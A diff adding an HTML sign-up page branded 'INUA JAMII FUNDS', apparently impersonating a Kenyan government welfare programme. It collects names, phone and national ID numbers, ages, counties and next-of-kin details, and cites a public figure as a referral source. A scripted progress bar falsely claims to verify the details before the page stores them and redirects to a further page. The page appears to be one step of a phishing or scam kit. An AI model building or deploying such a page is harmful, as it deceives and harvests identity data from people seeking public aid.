@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" /
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>INUA JAMII FUNDS</title>
+<!-- Google Fonts -->
+<link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&amp;display=swap" rel="stylesheet" />
+<style>
+    @media(max-width: 480px){
+  body {
+    zoom: 0.8; /* Optional: slightly zoom out for small screens */
+  }
+  .card {
+    transform: scale(0.9); /* Scale down the card */
+    transform-origin: top; /* Optional: scale from the top */
+  }
+    }
+  body {
+    margin: 0;
+    font-family: 'Raleway', sans-serif;
+    /* Green gradient background with overlay */
+    background: linear-gradient(135deg, #4CAF50, #81C784);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+  }
+
+  /* Optional overlay for darkening background for better contrast */
+  body::before {
+    content: "";
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0, 0, 0, 0.2);
+    z-index: -1;
+  }
+
+  .card {
+    background: #fff;
+    width: 95%;
+    max-width: 950px;
+    border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+    padding: 40px 30px;
+    position: relative;
+    z-index: 1;
+  }
+
+  .header {
+    text-align: center;
+    margin-bottom: 30px;
+  }
+
+  .header h1 {
+    font-size: 2.5em;
+    color: #00695c;
+    margin-bottom: 10px;
+  }
+
+  .header p {
+    font-size: 1.1em;
+    color: #555;
+  }
+
+  /* Form styles */
+  form {
+    display: flex;
+    flex-direction: column;
+  }
+
+  .section {
+    margin-bottom: 40px;
+  }
+
+  .section h2 {
+    font-size: 1.8em;
+    color: #00796b;
+    margin-bottom: 20px;
+  }
+
+  .form-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+  }
+
+  label {
+    display: block;
+    margin-bottom: 6px;
+    font-weight: 600;
+    font-size: 0.95em;
+  }
+
+  input, select {
+    width: 100%;
+    padding: 14px 18px;
+    border-radius: 10px;
+    border: 2px solid #ccc;
+    font-size: 1em;
+    outline: none;
+    transition: border-color 0.3s, box-shadow 0.2s, background-color 0.2s;
+  }
+
+  input:focus, select:focus {
+    border-color: #009688;
+    box-shadow: 0 0 8px rgba(0, 150, 136, 0.2);
+  }
+
+  input:hover, select:hover {
+    background-color: #e0f2f1;
+  }
+
+  /* Error message style */
+  .error-message {
+    color: #d32f2f;
+    font-size: 0.85em;
+    margin-top: 4px;
+    display: none;
+  }
+
+  .error-message.show {
+    display: block;
+  }
+
+  /* Button styles */
+  button {
+    background-color: #009688;
+    color: #fff;
+    padding: 16px;
+    border: none;
+    border-radius: 12px;
+    font-size: 1.2em;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: background 0.3s, transform 0.2s;
+  }
+
+  button:hover {
+    background-color: #00675b;
+    transform: translateY(-2px);
+  }
+
+  button:disabled {
+    background-color: #b2dfdb;
+    cursor: not-allowed;
+    transform: none;
+  }
+
+  /* Icon in button */
+  button span {
+    margin-left: 10px;
+  }
+
+  /* Footer */
+  .footer {
+    text-align: center;
+    margin-top: 50px;
+    font-size: 1em;
+    color: #fff;
+  }
+
+  /* Responsive adjustments */
+  @media(max-width: 768px){
+    .form-grid {
+      grid-template-columns: 1fr;
+    }
+  }
+
+  /* Modal overlay for processing */
+  #processingOverlay {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0,0,0,0.4);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+  }
+
+  #processingBox {
+    background: #fff;
+    padding: 30px;
+    border-radius: 15px;
+    width: 90%;
+    max-width: 400px;
+    text-align: center;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.2);
+    position: relative;
+  }
+
+  #processingBox h3 {
+    margin-bottom: 20px;
+    color: #00695c;
+  }
+
+  .loader {
+    border: 6px solid #f3f3f3;
+    border-top: 6px solid #009688;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    margin: 20px auto;
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg);}
+    100% { transform: rotate(360deg);}
+  }
+
+  /* Progress bar inside modal */
+  #progressBarContainer {
+    width: 100%;
+    background-color: #eee;
+    border-radius: 8px;
+    overflow: hidden;
+    margin-top: 20px;
+  }
+
+  #progressBar {
+    height: 8px;
+    width: 0%;
+    background-color: #009688;
+    transition: width 0.4s;
+  }
+
+  /* Success message styling */
+  #successMessage {
+    display: none;
+    margin-top: 20px;
+    font-size: 1.2em;
+    color: #2e7d32;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="header">
+    <h1>INUA JAMII FUNDS</h1>
+    <p>Empowering communities, one step at a time</p>
+  </div>
+
+  <form id="nyotaForm" novalidate>
+    <!-- Personal Data -->
+    <div class="section">
+      <h2>Personal Details</h2>
+      <div class="form-grid">
+        <div>
+          <label for="name">Full Name</label>
+          <input type="text" id="name" placeholder="Your full name" required />
+          <div class="error-message" id="error-name"></div>
+        </div>
+        <div>
+          <label for="phone">Phone Number</label>
+          <input type="text" id="phone" placeholder="07XXXXXXXX" required />
+          <div class="error-message" id="error-phone"></div>
+        </div>
+        <div>
+          <label for="id">ID Number</label>
+          <input type="text" id="id" placeholder="ID Number" required />
+          <div class="error-message" id="error-id"></div>
+        </div>
+        <div>
+          <label for="age">Age</label>
+          <input type="number" id="age" placeholder="e.g., 25" required />
+          <div class="error-message" id="error-age"></div>
+        </div>
+        <div>
+          <label for="occupation">Occupation</label>
+          <input type="text" id="occupation" placeholder="Your job" required />
+          <div class="error-message" id="error-occupation"></div>
+        </div>
+        <div>
+          <label for="county">County</label>
+          <input type="text" id="county" placeholder="County of residence" required />
+          <div class="error-message" id="error-county"></div>
+        </div>
+        <div>
+          <label for="email">Email (Optional)</label>
+          <input type="email" id="email" placeholder="example@domain.com" />
+          <div class="error-message" id="error-email"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Next of Kin -->
+    <div class="section">
+      <h2>Next of Kin (Optional)</h2>
+      <div class="form-grid">
+        <div>
+          <label for="nokName">Name</label>
+          <input type="text" id="nokName" placeholder="NOK Name" />
+          <div class="error-message" id="error-nokName"></div>
+        </div>
+        <div>
+          <label for="nokPhone">Phone</label>
+          <input type="text" id="nokPhone" placeholder="NOK Phone" />
+          <div class="error-message" id="error-nokPhone"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- How did you hear about us -->
+    <div class="section">
+      <h2>Discover INUA JAMII</h2>
+      <select id="discovery" required>
+        <option value="">Select how you heard about us</option>
+        <option>Hon Rachael Ruto</option>
+        <option>Facebook</option>
+        <option>Twitter</option>
+        <option>Friend / Relative</option>
+        <option>Radio</option>
+        <option>TV</option>
+        <option>Other</option>
+      </select>
+      <div class="error-message" id="error-discovery"></div>
+    </div>
+
+    <!-- Submit Button -->
+    <button type="submit" disabled>
+      <span>🌟 Get Started</span>
+    </button>
+
+    <!-- Success Message -->
+    <div id="successMessage">Thank you! Redirecting...</div>
+
+    <!-- Footer -->
+    <div class="footer">
+      🇰🇪 INUA JAMII FUNDS - Transforming Lives 🇰🇪
+    </div>
+  </form>
+</div>
+
+<!-- Processing Overlay -->
+<div id="processingOverlay">
+  <div id="processingBox">
+    <div class="loader"></div>
+    <h3>Processing Your Application...</h3>
+    <div id="progressBarContainer">
+      <div id="progressBar"></div>
+    </div>
+    <p>Please wait while we verify your details. This may take a few seconds.</p>
+  </div>
+</div>
+
+<script>
+(function() {
+  // On page load, populate form with saved data if exists
+  const savedData = localStorage.getItem('nyota_finalData');
+  if (savedData) {
+    try {
+      const data = JSON.parse(savedData);
+      document.getElementById('name').value = data.first_name || '';
+      document.getElementById('phone').value = data.phone_number || '';
+      document.getElementById('id').value = data.id_number || '';
+      document.getElementById('age').value = data.age || '';
+      document.getElementById('county').value = data.county || '';
+      document.getElementById('email').value = data.email || '';
+      // Note: Optional fields for NOK, etc., are not stored here, but could be added similarly.
+    } catch(e) {
+      // ignore parsing errors
+    }
+  }
+
+  const form = document.getElementById('nyotaForm');
+  const submitBtn = form.querySelector('button[type="submit"]');
+  const overlay = document.getElementById('processingOverlay');
+  const progressBar = document.getElementById('progressBar');
+  const successMsg = document.getElementById('successMessage');
+
+  const fields = {
+    name: {
+      element: document.getElementById('name'),
+      error: document.getElementById('error-name'),
+      validate: v => v.trim().length >= 3 && /^[\p{L}\s'.-]+$/u.test(v) ? '' : 'Enter a valid full name.'
+    },
+    phone: {
+      element: document.getElementById('phone'),
+      error: document.getElementById('error-phone'),
+      validate: v => /^07\d{8}$/.test(v.trim()) ? '' : 'Phone must be 07XXXXXXXX.'
+    },
+    id: {
+      element: document.getElementById('id'),
+      error: document.getElementById('error-id'),
+      validate: v => /^\d{6,12}$/.test(v.trim()) ? '' : 'ID must be 6-12 digits.'
+    },
+    age: {
+      element: document.getElementById('age'),
+      error: document.getElementById('error-age'),
+      validate: v => {
+        const num = Number(v);
+        if (!v.trim()) return 'Age is required.';
+        if (isNaN(num) || num < 18) return 'Must be at least 18.';
+        if (num > 120) return 'Enter a valid age.';
+        return '';
+      }
+    },
+    occupation: {
+      element: document.getElementById('occupation'),
+      error: document.getElementById('error-occupation'),
+      validate: v => v.trim().length >= 2 ? '' : 'Enter occupation.'
+    },
+    county: {
+      element: document.getElementById('county'),
+      error: document.getElementById('error-county'),
+      validate: v => v.trim().length >= 2 ? '' : 'Enter county.'
+    },
+    email: {
+      element: document.getElementById('email'),
+      error: document.getElementById('error-email'),
+      validate: v => v.trim() && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim()) ? 'Invalid email.' : ''
+    },
+    nokName: {
+      element: document.getElementById('nokName'),
+      error: document.getElementById('error-nokName'),
+      validate: v => v.trim() && v.trim().length < 2 ? 'Provide a real name or leave empty.' : ''
+    },
+    nokPhone: {
+      element: document.getElementById('nokPhone'),
+      error: document.getElementById('error-nokPhone'),
+      validate: v => v.trim() && /^07\d{8}$/.test(v.trim()) ? '' : 'NOK Phone must be 07XXXXXXXX.'
+    },
+    discovery: {
+      element: document.getElementById('discovery'),
+      error: document.getElementById('error-discovery'),
+      validate: v => v ? '' : 'Please select how you heard about us.'
+    }
+  };
+
+  function validateField(field) {
+    const v = field.element.value;
+    const msg = field.validate(v);
+    if (msg) {
+      field.error.textContent = msg;
+      field.error.className = 'error-message show';
+    } else {
+      field.error.textContent = '';
+      field.error.className = 'error-message';
+    }
+  }
+
+  function validateForm() {
+    let isValid = true;
+    for (const key in fields) {
+      if (['email', 'nokName', 'nokPhone'].includes(key) && fields[key].element.value.trim() === '') {
+        fields[key].error.className = 'error-message'; // hide error for optional empty
+        continue;
+      }
+      validateField(fields[key]);
+      if (fields[key].error.className.includes('show')) {
+        isValid = false;
+      }
+    }
+    submitBtn.disabled = !isValid;
+    return isValid;
+  }
+
+  for (const key in fields) {
+    fields[key].element.addEventListener('input', () => {
+      validateField(fields[key]);
+      validateForm();
+    });
+  }
+
+  document.getElementById('nyotaForm').addEventListener('submit', e => {
+    e.preventDefault();
+    if (!validateForm()) return;
+
+    overlay.style.display = 'flex';
+
+    // Animate progress bar
+    let stepIndex = 0;
+    const progressSteps = [10, 25, 40, 55, 70, 85, 100];
+
+    const progressInterval = setInterval(() => {
+      if (stepIndex >= progressSteps.length) {
+        clearInterval(progressInterval);
+        setTimeout(() => {
+          overlay.style.display = 'none';
+          successMsg.style.display = 'block';
+
+          // Save only the latest form data
+          const dataToSave = {
+            first_name: fields.name.element.value.trim(),
+            phone_number: fields.phone.element.value.trim(),
+            id_number: fields.id.element.value.trim(),
+            age: fields.age.element.value.trim(),
+            county: fields.county.element.value.trim(),
+            email: fields.email.element.value.trim(),
+            nokName: fields.nokName.element.value.trim(),
+            nokPhone: fields.nokPhone.element.value.trim(),
+            discovery: fields.discovery.element.value,
+            timestamp: new Date().toISOString()
+          };
+          localStorage.setItem('nyota_finalData', JSON.stringify(dataToSave));
+
+          // Redirect after 2 seconds
+          setTimeout(() => {
+            window.location.href = 'index3.html';
+          }, 2000);
+        }, 600);
+        return;
+      }
+      progressBar.style.width = progressSteps[stepIndex] + '%';
+      stepIndex++;
+    }, 700);
+  });
+})();
+</script>
+
+</body>
+
+
+</html>
